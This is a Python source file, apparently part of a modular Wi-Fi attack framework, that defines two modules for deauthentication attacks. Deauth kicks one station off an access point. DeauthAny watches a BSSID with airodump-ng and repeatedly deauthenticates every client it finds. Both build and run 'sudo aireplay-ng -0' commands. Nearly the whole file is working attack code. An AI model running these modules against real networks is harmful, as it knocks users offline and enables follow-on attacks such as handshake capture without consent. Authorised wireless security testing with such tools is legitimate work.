# -*- coding: UTF-8 -*-
from lib.wifi import *


class Deauth(WifiAttackModule):
    """ Deauthenticate the target station connected to the given BSSID given its
         MAC address.
    
    Author:  Yannick Pasquazzo
    Version: 1.0
    """
    config = Config({
        Option(
            'STATION',
            "Target station's MAC address",
            True,
            validate=lambda s, v: re.match(r"(?:[0-9A-F]{2}\:){5}[0-9A-F]{2}", \
                                           v) is not None,
        ): "00:00:00:00:00:00",
    })
    requirements = {'system': ["aircrack-ng/aireplay-ng"]}
    
    def run(self):
        t = self.console.state['TARGETS']
        bssid = t[self.config.option('ESSID').value]['bssid']
        sta = self.config.option('STATION').value
        _ = [i for i, mon in self.console.state['INTERFACES'].items() if mon]
        mon_if = _[0]
        self.logger.warning("Deauth station: {}".format(sta))
        cmd = "sudo aireplay-ng -0 5 -a {} -c {} {}".format(bssid, sta, mon_if)
        self.console._jobs.run(cmd)


class DeauthAny(WifiAttackModule):
    """ Deauthenticate any target found connectect to the given BSSID on the
         given channel.
    
    Author:  Yannick Pasquazzo
    Version: 1.0
    """
    config = Config({
        Option(
            'DEAUTH_INTERVAL',
            "Target station deauthentication interval (seconds)",
            False,
        ): 5,
    })
    requirements = {'system': ["aircrack-ng/aireplay-ng"]}
    
    def run(self):
        self.logger.warning("Press Ctrl+C to interrupt")
        t = self.console.state['TARGETS']
        _ = t[self.config.option('ESSID').value]
        bssid, ch = _['bssid'], _['channel']
        deauth_int = self.config.option('DEAUTH_INTERVAL').value
        _ = [i for i, mon in self.console.state['INTERFACES'].items() if mon]
        mon_if = _[0]
        cmd = "sudo airodump-ng -c {} --bssid {} {}".format(ch, bssid, mon_if)
        tr = {}
        # capture packets on the target BSSID
        for line in self.console._jobs.run_iter(cmd):
            self.logger.debug(line)
            _ = STATION_REGEX.search(line)
            # deauthenticate any station found
            if _ is not None:
                station = _.group("station")
                tr.setdefault(station, 0)
                if time() - tr[station] > deauth_int:
                    self.logger.warning("Deauth station: {}".format(station))
                    c = "sudo aireplay-ng -0 5 -a {} -c {} {}" \
                        .format(bssid, station, mon_if)
                    self.console._jobs.process(c).wait()
                    tr[station] = time()
